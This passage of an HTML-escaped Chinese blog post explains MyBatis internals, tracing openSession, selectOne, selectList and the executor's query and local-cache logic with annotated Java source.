&lt;pre class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-Java" data-lang="Java"> &lt;span class="kd">public&lt;/span> &lt;span class="n">SqlSession&lt;/span> &lt;span class="nf">openSession&lt;/span>&lt;span class="o">()&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">openSessionFromDataSource&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">configuration&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getDefaultExecutorType&lt;/span>&lt;span class="o">(),&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="kc">false&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="kd">private&lt;/span> &lt;span class="n">SqlSession&lt;/span> &lt;span class="nf">openSessionFromDataSource&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">ExecutorType&lt;/span> &lt;span class="n">execType&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">TransactionIsolationLevel&lt;/span> &lt;span class="n">level&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="kt">boolean&lt;/span> &lt;span class="n">autoCommit&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="c1">// Transaction事务，包装了一个Connection, 包含commit,rollback,close方法
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">Transaction&lt;/span> &lt;span class="n">tx&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="o">;&lt;/span>
&lt;span class="k">try&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="c1">// 还记得么, environment里封装了我们的数据源;事务工厂;还有环境
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="n">Environment&lt;/span> &lt;span class="n">environment&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">configuration&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getEnvironment&lt;/span>&lt;span class="o">();&lt;/span>
&lt;span class="c1">// 得到一个事务工厂, 如果env或者env里的事务工厂是空的就返回一个托管事务工厂
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 托管事务工厂的特点就是每次执行完成SQL都会关闭连接, 如果你不希望关闭连接要在配置文件里设置它
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="n">TransactionFactory&lt;/span> &lt;span class="n">transactionFactory&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">getTransactionFactoryFromEnvironment&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">environment&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="c1">//通过事务工厂来产生一个事务
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">tx&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">transactionFactory&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">newTransaction&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">environment&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getDataSource&lt;/span>&lt;span class="o">(),&lt;/span> &lt;span class="n">level&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">autoCommit&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="c1">//生成一个执行器(事务包含在执行器里)
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="n">Executor&lt;/span> &lt;span class="n">executor&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">configuration&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">newExecutor&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">tx&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">execType&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="c1">//然后产生一个DefaultSqlSession
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">return&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">DefaultSqlSession&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">configuration&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">executor&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">autoCommit&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="o">}&lt;/span> &lt;span class="k">catch&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">Exception&lt;/span> &lt;span class="n">e&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="c1">//如果打开事务出错，则关闭它
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">closeTransaction&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">tx&lt;/span>&lt;span class="o">);&lt;/span> &lt;span class="c1">// may have fetched a connection so lets call close()
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">throw&lt;/span> &lt;span class="n">ExceptionFactory&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">wrapException&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="s">&amp;#34;Error opening session. Cause: &amp;#34;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">e&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">e&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="o">}&lt;/span> &lt;span class="k">finally&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="c1">//最后清空错误上下文
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">ErrorContext&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">instance&lt;/span>&lt;span class="o">().&lt;/span>&lt;span class="na">reset&lt;/span>&lt;span class="o">();&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>这样我们就得到了一个&lt;code>SqlSession&lt;/code>.&lt;/p>
&lt;blockquote>
&lt;p>2020.10.12 继续更新&lt;/p>
&lt;/blockquote>
&lt;p>有了&lt;code>SqlSession&lt;/code>之后我们就可以操作数据库了。&lt;/p>
&lt;p>我们来看看MyBatis是怎么实现&lt;code>session.selectOne(&amp;quot;org.mybatis.example.BlogMapper.selectBlog&amp;quot;, 101);&lt;/code>的。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;span class="lnt">47
&lt;/span>&lt;span class="lnt">48
&lt;/span>&lt;span class="lnt">49
&lt;/span>&lt;span class="lnt">50
&lt;/span>&lt;span class="lnt">51
&lt;/span>&lt;span class="lnt">52
&lt;/span>&lt;span class="lnt">53
&lt;/span>&lt;span class="lnt">54
&lt;/span>&lt;span class="lnt">55
&lt;/span>&lt;span class="lnt">56
&lt;/span>&lt;span class="lnt">57
&lt;/span>&lt;span class="lnt">58
&lt;/span>&lt;span class="lnt">59
&lt;/span>&lt;span class="lnt">60
&lt;/span>&lt;span class="lnt">61
&lt;/span>&lt;span class="lnt">62
&lt;/span>&lt;span class="lnt">63
&lt;/span>&lt;span class="lnt">64
&lt;/span>&lt;span class="lnt">65
&lt;/span>&lt;span class="lnt">66
&lt;/span>&lt;span class="lnt">67
&lt;/span>&lt;span class="lnt">68
&lt;/span>&lt;span class="lnt">69
&lt;/span>&lt;span class="lnt">70
&lt;/span>&lt;span class="lnt">71
&lt;/span>&lt;span class="lnt">72
&lt;/span>&lt;span class="lnt">73
&lt;/span>&lt;span class="lnt">74
&lt;/span>&lt;span class="lnt">75
&lt;/span>&lt;span class="lnt">76
&lt;/span>&lt;span class="lnt">77
&lt;/span>&lt;span class="lnt">78
&lt;/span>&lt;span class="lnt">79
&lt;/span>&lt;span class="lnt">80
&lt;/span>&lt;span class="lnt">81
&lt;/span>&lt;span class="lnt">82
&lt;/span>&lt;span class="lnt">83
&lt;/span>&lt;span class="lnt">84
&lt;/span>&lt;span class="lnt">85
&lt;/span>&lt;span class="lnt">86
&lt;/span>&lt;span class="lnt">87
&lt;/span>&lt;span class="lnt">88
&lt;/span>&lt;span class="lnt">89
&lt;/span>&lt;span class="lnt">90
&lt;/span>&lt;span class="lnt">91
&lt;/span>&lt;span class="lnt">92
&lt;/span>&lt;span class="lnt">93
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-Java" data-lang="Java"> &lt;span class="kd">public&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">T&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">T&lt;/span> &lt;span class="nf">selectOne&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">String&lt;/span> &lt;span class="n">statement&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">Object&lt;/span> &lt;span class="n">parameter&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="c1">// Popular vote was to return null on 0 results and throw exception on too many.
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">//转而去调用selectList,很简单的，如果得到0条则返回null，得到1条则返回1条，得到多条报TooManyResultsException错
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 特别需要主要的是当没有查询到结果的时候就会返回null。因此一般建议在mapper中编写resultType的时候使用包装类型
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">//而不是基本类型，比如推荐使用Integer而不是int。这样就可以避免NPE
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">List&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">T&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">list&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">this&lt;/span>&lt;span class="o">.&amp;lt;&lt;/span>&lt;span class="n">T&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="n">selectList&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">statement&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">parameter&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">list&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">size&lt;/span>&lt;span class="o">()&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">1&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">list&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">get&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">0&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="o">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">list&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">size&lt;/span>&lt;span class="o">()&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">1&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="k">throw&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">TooManyResultsException&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="s">&amp;#34;Expected one result (or null) to be returned by selectOne(), but found: &amp;#34;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">list&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">size&lt;/span>&lt;span class="o">());&lt;/span>
&lt;span class="o">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="o">;&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="c1">// emm，这里其实啥都没有，我们去SelectList看看。
&lt;/span>&lt;span class="c1">&lt;/span>
&lt;span class="c1">// 在下来解释一下这三个参数：
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// statement 映射语句的位置，比如&amp;#34;org.mybatis.example.BlogMapper.selectBlog&amp;#34;
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// parameter SQL语句中的参数
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// RowBounds 分页限制，相当于SQL中的limit.
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kd">public&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">E&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">List&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">E&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="nf">selectList&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">String&lt;/span> &lt;span class="n">statement&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">Object&lt;/span> &lt;span class="n">parameter&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">RowBounds&lt;/span> &lt;span class="n">rowBounds&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="k">try&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="c1">//根据statement id找到对应的MappedStatement
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">MappedStatement&lt;/span> &lt;span class="n">ms&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">configuration&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getMappedStatement&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">statement&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="c1">//转而用执行器来查询结果,注意这里传入的ResultHandler是null
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// wrapCollection：如果参数是Collection类型，转换成Map，key为parameter的type.
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">return&lt;/span> &lt;span class="n">executor&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">query&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">ms&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">wrapCollection&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">parameter&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="n">rowBounds&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">Executor&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">NO_RESULT_HANDLER&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="o">}&lt;/span> &lt;span class="k">catch&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">Exception&lt;/span> &lt;span class="n">e&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="k">throw&lt;/span> &lt;span class="n">ExceptionFactory&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">wrapException&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="s">&amp;#34;Error querying database. Cause: &amp;#34;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">e&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">e&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="o">}&lt;/span> &lt;span class="k">finally&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="n">ErrorContext&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">instance&lt;/span>&lt;span class="o">().&lt;/span>&lt;span class="na">reset&lt;/span>&lt;span class="o">();&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="c1">// 接下来是执行器的部分
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kd">public&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">E&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">List&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">E&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="nf">query&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">MappedStatement&lt;/span> &lt;span class="n">ms&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">Object&lt;/span> &lt;span class="n">parameter&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">RowBounds&lt;/span> &lt;span class="n">rowBounds&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">ResultHandler&lt;/span> &lt;span class="n">resultHandler&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="kd">throws&lt;/span> &lt;span class="n">SQLException&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="c1">//得到绑定sql，就是将参数插入映射语句里，获得完整的SQL
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">BoundSql&lt;/span> &lt;span class="n">boundSql&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ms&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getBoundSql&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">parameter&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="c1">//创建缓存Key
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">CacheKey&lt;/span> &lt;span class="n">key&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">createCacheKey&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">ms&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">parameter&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">rowBounds&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">boundSql&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="c1">//查询
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">return&lt;/span> &lt;span class="n">query&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">ms&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">parameter&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">rowBounds&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">resultHandler&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">key&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">boundSql&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="c1">// 执行查询
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kd">public&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">E&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">List&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">E&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="nf">query&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">MappedStatement&lt;/span> &lt;span class="n">ms&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">Object&lt;/span> &lt;span class="n">parameter&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">RowBounds&lt;/span> &lt;span class="n">rowBounds&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">ResultHandler&lt;/span> &lt;span class="n">resultHandler&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">CacheKey&lt;/span> &lt;span class="n">key&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">BoundSql&lt;/span> &lt;span class="n">boundSql&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="kd">throws&lt;/span> &lt;span class="n">SQLException&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="c1">// ErrorContext 是每个线程单独使用的错误上下文，它是用ThreadLocal制作的.
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">ErrorContext&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">instance&lt;/span>&lt;span class="o">().&lt;/span>&lt;span class="na">resource&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">ms&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getResource&lt;/span>&lt;span class="o">()).&lt;/span>&lt;span class="na">activity&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="s">&amp;#34;executing a query&amp;#34;&lt;/span>&lt;span class="o">).&lt;/span>&lt;span class="na">object&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">ms&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getId&lt;/span>&lt;span class="o">());&lt;/span>
&lt;span class="c1">//如果已经关闭，报错
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">closed&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="k">throw&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">ExecutorException&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="s">&amp;#34;Executor was closed.&amp;#34;&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="c1">//先清局部缓存，再查询.但仅查询堆栈为0，才清。为了处理递归调用
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">queryStack&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">0&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="n">ms&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">isFlushCacheRequired&lt;/span>&lt;span class="o">())&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="n">clearLocalCache&lt;/span>&lt;span class="o">();&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="n">List&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">E&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">list&lt;/span>&lt;span class="o">;&lt;/span>
&lt;span class="k">try&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="c1">//加一,这样递归调用到上面的时候就不会再清局部缓存了
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">queryStack&lt;/span>&lt;span class="o">++;&lt;/span>
&lt;span class="c1">//先根据cachekey从localCache去查
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">list&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">resultHandler&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="kc">null&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">List&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">E&lt;/span>&lt;span class="o">&amp;gt;)&lt;/span> &lt;span class="n">localCache&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getObject&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">key&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="o">;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">list&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="c1">//若查到localCache缓存，处理localOutputParameterCache
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">handleLocallyCachedOutputParameters&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">ms&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">key&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">parameter&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">boundSql&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="o">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="c1">//从数据库查
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">list&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">queryFromDatabase&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">ms&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">parameter&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">rowBounds&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">resultHandler&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">key&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">boundSql&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="o">}&lt;/span> &lt;span class="k">finally&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="c1">//清空堆栈
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">queryStack&lt;/span>&lt;span class="o">--;&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">queryStack&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">0&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="c1">//延迟加载队列中所有元素
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">DeferredLoad&lt;/span> &lt;span class="n">deferredLoad&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="n">deferredLoads&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="n">deferredLoad&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">load&lt;/span>&lt;span class="o">();&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="c1">// issue #601
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">//清空延迟加载队列
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">deferredLoads&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">clear&lt;/span>&lt;span class="o">();&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">configuration&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getLocalCacheScope&lt;/span>&lt;span class="o">()&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">LocalCacheScope&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">STATEMENT&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
